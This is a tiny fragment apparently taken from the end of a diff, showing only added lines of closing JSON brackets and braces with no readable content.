+          ]
+        }
+      ]
+    }
+  ]
+}
